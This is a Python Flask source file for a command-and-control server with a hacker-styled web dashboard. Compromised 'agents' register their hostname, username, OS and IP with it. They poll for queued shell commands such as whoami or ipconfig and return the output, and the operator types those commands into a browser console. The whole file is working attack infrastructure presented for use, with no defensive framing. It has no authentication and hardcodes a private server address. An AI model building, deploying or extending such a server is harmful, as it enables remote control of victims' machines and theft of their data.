#!/usr/bin/env python3
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import json
import uuid
import time
from datetime import datetime

app = Flask(__name__)
CORS(app)  # Allow connections from anywhere

# Store data
agents = {}
tasks = {}
task_results = {}

# HTML Dashboard
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>C2 Framework - Control Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff41;
            height: 100vh;
            overflow: hidden;
        }
        .container { display: flex; height: 100vh; }
        .sidebar {
            width: 320px;
            background: #0d1117;
            border-right: 1px solid #00ff41;
            overflow-y: auto;
            padding: 20px;
        }
        .main {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        .terminal {
            background: #000000;
            flex: 1;
            padding: 20px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 13px;
        }
        .command-bar {
            background: #0d1117;
            border-top: 1px solid #00ff41;
            padding: 15px;
            display: flex;
            gap: 10px;
        }
        .command-bar input {
            background: #000000;
            border: 1px solid #00ff41;
            color: #00ff41;
            padding: 10px;
            flex: 1;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .command-bar button {
            background: #00ff41;
            color: #000000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
            font-family: monospace;
        }
        .command-bar button:hover {
            background: #00cc33;
        }
        .agent-item {
            padding: 10px;
            margin: 8px 0;
            background: #1a1f2e;
            cursor: pointer;
            border-left: 3px solid #00ff41;
            transition: all 0.2s;
        }
        .agent-item:hover {
            background: #2a2f3e;
            transform: translateX(5px);
        }
        .agent-item.active {
            background: #00ff41;
            color: #000000;
        }
        .agent-item.active .agent-info {
            color: #000000;
        }
        .agent-name {
            font-weight: bold;
            font-size: 14px;
        }
        .agent-info {
            font-size: 11px;
            margin-top: 5px;
            color: #888;
        }
        .status-badge {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #00ff41;
            margin-right: 8px;
            animation: pulse 1s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        .command-output {
            color: #cccccc;
            margin: 8px 0 8px 20px;
            white-space: pre-wrap;
            border-left: 2px solid #00ff41;
            padding-left: 15px;
        }
        .command-line {
            color: #00ff41;
            margin: 8px 0;
            font-weight: bold;
        }
        h2 {
            font-size: 18px;
            margin-bottom: 15px;
            border-bottom: 1px solid #00ff41;
            padding-bottom: 5px;
        }
        .header {
            margin-bottom: 20px;
        }
        .stats {
            font-size: 12px;
            margin-top: 10px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="sidebar">
            <div class="header">
                <h2>🕶️ C2 Framework</h2>
                <div class="stats" id="stats">Connected: 0 agents</div>
            </div>
            <div id="agents-list">
                <div style="text-align: center; padding: 20px;">Waiting for agents...</div>
            </div>
        </div>
        <div class="main">
            <div class="terminal" id="terminal">
                <div class="command-line">=== C2 Command Console ===</div>
                <div class="command-line">Select an agent from the left panel</div>
                <div class="command-line">Type commands below and press Enter</div>
                <div class="command-line">=====================================</div>
                <div id="output-area"></div>
            </div>
            <div class="command-bar">
                <input type="text" id="command-input" placeholder="Enter command (e.g., whoami, ipconfig, dir)" autocomplete="off">
                <button onclick="sendCommand()">Execute</button>
            </div>
        </div>
    </div>

    <script>
        let currentAgent = null;
        
        function loadAgents() {
            fetch('/api/agents')
                .then(res => res.json())
                .then(data => {
                    const container = document.getElementById('agents-list');
                    const stats = document.getElementById('stats');
                    stats.innerHTML = `Connected: ${data.length} agents`;
                    
                    if (data.length === 0) {
                        container.innerHTML = '<div style="text-align: center; padding: 20px;">No agents connected</div>';
                        return;
                    }
                    
                    container.innerHTML = '';
                    data.forEach(agent => {
                        const div = document.createElement('div');
                        div.className = 'agent-item';
                        if (currentAgent === agent.agent_id) div.classList.add('active');
                        div.onclick = () => selectAgent(agent.agent_id);
                        div.innerHTML = `
                            <div class="agent-name">
                                <span class="status-badge"></span>
                                ${agent.agent_id}
                            </div>
                            <div class="agent-info">
                                📡 ${agent.hostname}<br>
                                👤 ${agent.username}<br>
                                💻 ${agent.os_type}<br>
                                🌐 ${agent.ip_address}
                            </div>
                        `;
                        container.appendChild(div);
                    });
                });
        }
        
        function selectAgent(agentId) {
            currentAgent = agentId;
            addToTerminal(`[+] Selected agent: ${agentId}`, 'info');
            loadAgents();
        }
        
        function addToTerminal(text, type = 'output') {
            const outputArea = document.getElementById('output-area');
            const line = document.createElement('div');
            if (type === 'command') {
                line.innerHTML = `<div class="command-line">${currentAgent ? currentAgent + '# ' : ''}${text}</div>`;
            } else if (type === 'info') {
                line.innerHTML = `<div style="color: #00ff41; margin: 5px 0;">${text}</div>`;
            } else {
                line.innerHTML = `<div class="command-output">${text}</div>`;
            }
            outputArea.appendChild(line);
            const terminal = document.getElementById('terminal');
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        function sendCommand() {
            const input = document.getElementById('command-input');
            const command = input.value.trim();
            if (!command) return;
            if (!currentAgent) {
                addToTerminal('[-] No agent selected! Click on an agent first.', 'info');
                input.value = '';
                return;
            }
            
            addToTerminal(command, 'command');
            
            fetch('/api/send_command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    agent_id: currentAgent, 
                    command: command 
                })
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'sent') {
                    addToTerminal(`[+] Command sent (Task: ${data.task_id})`, 'info');
                } else {
                    addToTerminal('[-] Failed to send command', 'info');
                }
            })
            .catch(err => {
                addToTerminal(`[-] Error: ${err}`, 'info');
            });
            
            input.value = '';
        }
        
        function fetchResults() {
            if (currentAgent) {
                fetch(`/api/task_results/${currentAgent}`)
                    .then(res => res.json())
                    .then(data => {
                        data.forEach(result => {
                            if (result.output && result.output.trim()) {
                                addToTerminal(result.output);
                            }
                        });
                    })
                    .catch(err => console.error('Fetch error:', err));
            }
        }
        
        document.getElementById('command-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') sendCommand();
        });
        
        // Auto-refresh every 3 seconds
        setInterval(loadAgents, 3000);
        setInterval(fetchResults, 2000);
        loadAgents();
    </script>
</body>
</html>
'''

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/register', methods=['POST'])
def register_agent():
    try:
        data = request.json
        agent_id = str(uuid.uuid4())[:8]
        
        agents[agent_id] = {
            'agent_id': agent_id,
            'hostname': data.get('hostname', 'unknown'),
            'username': data.get('username', 'unknown'),
            'os_type': data.get('os_type', 'unknown'),
            'os_version': data.get('os_version', 'unknown'),
            'ip_address': data.get('ip_address', request.remote_addr),
            'privilege': data.get('privilege', 'user'),
            'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'last_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'status': 'active'
        }
        
        print(f"\n[+] New Agent Registered!")
        print(f"    ID: {agent_id}")
        print(f"    Host: {data.get('hostname')}")
        print(f"    User: {data.get('username')}")
        print(f"    OS: {data.get('os_type')}")
        print(f"    IP: {data.get('ip_address')}")
        
        return jsonify({'agent_id': agent_id, 'sleep_time': 5})
        
    except Exception as e:
        print(f"[-] Registration error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/beacon', methods=['POST'])
def handle_beacon():
    try:
        data = request.json
        agent_id = data.get('agent_id')
        
        if agent_id in agents:
            agents[agent_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            agents[agent_id]['status'] = 'active'
            
            # Get pending tasks
            pending_tasks = []
            for task_id, task in tasks.items():
                if task['agent_id'] == agent_id and task['status'] == 'pending':
                    pending_tasks.append({
                        'id': task_id,
                        'command': task['command']
                    })
                    task['status'] = 'sent'
            
            return jsonify({'tasks': pending_tasks, 'status': 'ok'})
        else:
            return jsonify({'tasks': [], 'status': 'error'}), 200
            
    except Exception as e:
        print(f"[-] Beacon error: {e}")
        return jsonify({'tasks': []}), 200

@app.route('/api/task_result', methods=['POST'])
def receive_task_result():
    try:
        data = request.json
        task_id = data.get('task_id')
        output = data.get('output', '')
        
        if task_id in tasks:
            tasks[task_id]['status'] = 'completed'
            tasks[task_id]['output'] = output
            tasks[task_id]['completed_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            agent_id = tasks[task_id]['agent_id']
            if agent_id not in task_results:
                task_results[agent_id] = []
            task_results[agent_id].append({
                'task_id': task_id,
                'command': tasks[task_id]['command'],
                'output': output,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            })
            
            print(f"[+] Task {task_id[:6]} completed for {agent_id}")
        
        return jsonify({'status': 'received'})
        
    except Exception as e:
        print(f"[-] Task result error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/send_command', methods=['POST'])
def send_command():
    try:
        data = request.json
        agent_id = data.get('agent_id')
        command = data.get('command')
        
        if agent_id not in agents:
            return jsonify({'error': 'Agent not found'}), 404
        
        task_id = str(uuid.uuid4())[:8]
        tasks[task_id] = {
            'id': task_id,
            'agent_id': agent_id,
            'command': command,
            'status': 'pending',
            'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        print(f"[+] Command sent to {agent_id}: {command[:50]}")
        return jsonify({'task_id': task_id, 'status': 'sent'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/agents', methods=['GET'])
def list_agents():
    agent_list = []
    for agent_id, info in agents.items():
        agent_list.append({
            'agent_id': agent_id,
            'hostname': info.get('hostname', 'unknown'),
            'username': info.get('username', 'unknown'),
            'os_type': info.get('os_type', 'unknown'),
            'ip_address': info.get('ip_address', 'unknown'),
            'last_seen': info.get('last_seen', 'unknown'),
            'status': info.get('status', 'unknown')
        })
    return jsonify(agent_list)

@app.route('/api/task_results/<agent_id>', methods=['GET'])
def get_task_results(agent_id):
    results = task_results.get(agent_id, [])
    task_results[agent_id] = []  # Clear after sending
    return jsonify(results)

@app.route('/api/tasks/<agent_id>', methods=['GET'])
def get_tasks(agent_id):
    pending = []
    for task_id, task in tasks.items():
        if task['agent_id'] == agent_id and task['status'] == 'pending':
            pending.append({
                'id': task_id,
                'command': task['command']
            })
    return jsonify(pending)

if __name__ == '__main__':
    print("="*60)
    print("C2 HTTP Server Started Successfully!")
    print("="*60)
    print(f"[+] Dashboard URL: http://172.24.1.83:5000")
    print(f"[+] API Endpoint: http://172.24.1.83:5000/api")
    print(f"[+] Port: 5000")
    print("[+] Press Ctrl+C to stop the server")
    print("="*60)
    print("\n[*] Ready for connections...\n")
    
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
